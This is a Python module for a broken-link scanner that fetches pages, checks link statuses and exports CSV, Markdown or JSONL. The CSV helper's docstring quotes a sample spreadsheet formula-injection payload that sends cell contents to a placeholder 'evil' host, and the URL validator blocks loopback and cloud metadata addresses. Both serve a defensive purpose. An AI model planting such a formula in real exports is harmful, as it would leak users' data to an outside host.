"""BrokenLinkBrief core helpers: dataclass/result model, scan, markdown, csv."""
from __future__ import annotations

import html
import json
import os
import re
from dataclasses import dataclass
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen


@dataclass
class LinkResult:
    url: str
    status: int | None = None
    reason: str | None = None
    location: str | None = None


_LINK_RE = re.compile(r'href\s*=\s*"([^"]+)"', re.IGNORECASE)
_TIMEOUT_RE = re.compile(r'timed out', re.IGNORECASE)
_SCAN_TOKEN_ENV = "BROKENLINKBRIEF_SCAN_TOKEN"


def _cast_status(value: object) -> tuple[int | None, str]:
    text = str(value) if value is not None else None
    return int(text) if text is not None else None, text or ""


def _request_head(
    base_url: str, timeout: float
) -> tuple[int | None, str | None, str | None]:
    req = Request(base_url, method="HEAD")
    try:
        with urlopen(req, timeout=timeout) as resp:
            status = getattr(resp, "status", None) or getattr(resp, "code", None)
            status_int, status_text = _cast_status(status)
            return status_int, status_text, resp.headers.get("Location")
    except HTTPError as exc:
        status = exc.code if exc.code is not None else getattr(exc, "status", None)
        status_int, status_text = _cast_status(status)
        location = None
        if exc.headers:
            location = exc.headers.get("Location")
        return status_int, status_text, location
    except URLError as exc:
        reason = str(exc.reason)
        if _TIMEOUT_RE.search(reason):
            return None, "timeout", None
        return None, reason, None


def _request_get(
    base_url: str, timeout: float
) -> tuple[int | None, str | None, str | None]:
    req = Request(base_url, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            status = getattr(resp, "status", None) or getattr(resp, "code", None)
            status_int, status_text = _cast_status(status)
            return status_int, status_text, resp.headers.get("Location")
    except HTTPError as exc:
        status = exc.code if exc.code is not None else getattr(exc, "status", None)
        status_int, status_text = _cast_status(status)
        location = None
        if exc.headers:
            location = exc.headers.get("Location")
        return status_int, status_text, location
    except URLError as exc:
        reason = str(exc.reason)
        if _TIMEOUT_RE.search(reason):
            return None, "timeout", None
        return None, reason, None


def _resolve_html_links(base_url: str, body: str) -> list[str]:
    urls: list[str] = []
    seen: set[str] = set()
    for href in _LINK_RE.findall(body):
        resolved = urljoin(base_url, html.unescape(href))
        parsed = urlparse(resolved)
        if parsed.scheme not in {"http", "https"}:
            continue
        if resolved not in seen:
            seen.add(resolved)
            urls.append(resolved)
    return urls


def get_configured_scan_token() -> str | None:
    token = os.environ.get(_SCAN_TOKEN_ENV)
    return token if token else None


def is_scan_authorized(token: str | None) -> bool:
    expected = get_configured_scan_token()
    if expected is None:
        return True
    return token is not None and token == expected


def fetch_html(base_url: str, timeout: float = 10.0) -> str | None:
    req = Request(base_url, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            content_type = resp.headers.get("Content-Type", "").lower()
            charset = "utf-8"
            if "charset=" in content_type:
                charset = (
                    content_type.split("charset=", 1)[1].split(";", 1)[0].strip()
                    or charset
                )
            data = resp.read()
            if isinstance(data, bytes):
                return data.decode(charset, errors="replace")
            return str(data)
    except (HTTPError, URLError):
        return None


def scan_page(url: str, timeout: float = 10.0) -> list[LinkResult]:
    body = fetch_html(url, timeout)
    if body is None:
        return [LinkResult(url=url, status=None, reason="fetch-failed", location=None)]
    links = _resolve_html_links(url, body)
    results: list[LinkResult] = []
    for link in links:
        status, reason, location = _request_head(link, timeout)
        if status is None and reason not in {None, "Unsupported method"}:
            results.append(
                LinkResult(url=link, status=status, reason=reason, location=location)
            )
            continue
        if status is not None and 100 <= int(status) < 400:
            results.append(
                LinkResult(url=link, status=status, reason=reason, location=location)
            )
            continue
        status, reason, location = _request_get(link, timeout)
        results.append(
            LinkResult(url=link, status=status, reason=reason, location=location)
        )
    return results


# Spreadsheet formula triggers: a cell that begins with one of these is
# executed as a formula by Excel/Sheets/LibreOffice when the CSV is opened.
# `location` is copied verbatim from a scanned server's `Location` response
# header and `reason` may also be attacker-influenced, so both are untrusted.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _csv_field(value: str) -> str:
    """Quote a CSV field per RFC 4180 and neutralize formula injection.

    A leading spreadsheet formula trigger (= + - @ \\t \\r) is prefixed with an
    apostrophe so the cell is treated as literal text instead of executing an
    attacker-controlled formula such as =HYPERLINK("http://evil/?c="&A1).
    """
    if value and value[0] in _FORMULA_TRIGGERS:
        value = "'" + value
    quote_chars = {'"', ",", "\n", "\r", "\t"}
    must_quote = any(char in value for char in quote_chars)
    must_quote = must_quote or value.startswith(" ") or value.endswith(" ")
    if must_quote:
        escaped = value.replace('"', '""')
        return f'"{escaped}"'
    return value


def render_csv(results: list[LinkResult]) -> str:
    """Render scan results as comma-safe CSV with a stable header row.

    Args:
        results: Ordered link results to export.

    Returns:
        A CSV string, always including the header row.
    """
    rows = ["url,status,reason,location"]
    for item in results:
        status = "" if item.status is None else str(item.status)
        reason = item.reason or ""
        location = item.location or ""
        rows.append(
            ",".join(
                [
                    _csv_field(item.url),
                    _csv_field(status),
                    _csv_field(reason),
                    _csv_field(location),
                ]
            )
        )
    return "\n".join(rows) + "\n"


def render_markdown(results: list[LinkResult]) -> str:
    lines = [
        "# BrokenLinkBrief",
        "",
        "| URL | Status | Reason | Location |",
        "| --- | ---: | --- | --- |",
    ]
    for item in results:
        status = "" if item.status is None else str(item.status)
        reason = item.reason or ""
        location = item.location or ""
        lines.append(f"| {item.url} | {status} | {reason} | {location} |")
    return "\n".join(lines) + "\n"


def validate_scan_url(url: str) -> str | None:
    """Return None if URL is safe to scan, error string if blocked.

    Blocks loopback, private IPs, metadata endpoints, and invalid URLs.
    Unlike validate_webhook_url, allows HTTP (not just HTTPS).
    """
    from ipaddress import ip_address

    _blocked_hosts = frozenset({
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "::1",
        "metadata.google.internal",
        "169.254.169.254",
    })

    def _is_private_ip(hostname: str) -> bool:
        try:
            addr = ip_address(hostname)
            return addr.is_private or addr.is_loopback or addr.is_link_local
        except ValueError:
            return False

    try:
        parsed = urlparse(url)
    except Exception:
        return "invalid URL"

    hostname = parsed.hostname or ""
    if not hostname:
        return "missing hostname"

    if hostname.lower() in _blocked_hosts:
        return f"blocked host: {hostname}"

    if _is_private_ip(hostname):
        return f"private IP: {hostname}"

    if parsed.scheme not in ("http", "https"):
        return f"unsupported scheme: {parsed.scheme}"

    return None


def scan_batch(
    urls: list[str],
    timeout: float = 10.0,
    max_workers: int = 5,
) -> dict[str, list[LinkResult]]:
    """Scan multiple URLs concurrently using a ThreadPoolExecutor.

    Returns a dict keyed by input URL, each value a list[LinkResult].
    Per-URL exceptions are captured as LinkResult(status=None, reason=str(exc)).
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    results: dict[str, list[LinkResult]] = {}

    def _scan_one(url: str) -> tuple[str, list[LinkResult]]:
        try:
            return url, scan_page(url, timeout=timeout)
        except Exception as exc:
            result = LinkResult(
                url=url, status=None, reason=str(exc), location=None
            )
            return url, [result]

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_scan_one, url): url for url in urls}
        for future in as_completed(futures):
            url, scan_results = future.result()
            results[url] = scan_results

    return results


def render_jsonl(results: list[LinkResult]) -> str:
    """Render scan results as JSON Lines (one JSON object per line).

    Each line is a self-contained JSON object with the fields ``url``,
    ``status``, ``reason``, and ``location`` — matching the contract
    expected by the ``format=jsonl`` HTTP route.

    Args:
        results: Ordered link results to export.

    Returns:
        A string with one JSON object per line, no trailing newline.
    """
    lines = [
        json.dumps(
            {
                "url": item.url,
                "status": item.status,
                "reason": item.reason,
                "location": item.location,
            }
        )
        for item in results
    ]
    return "\n".join(lines)
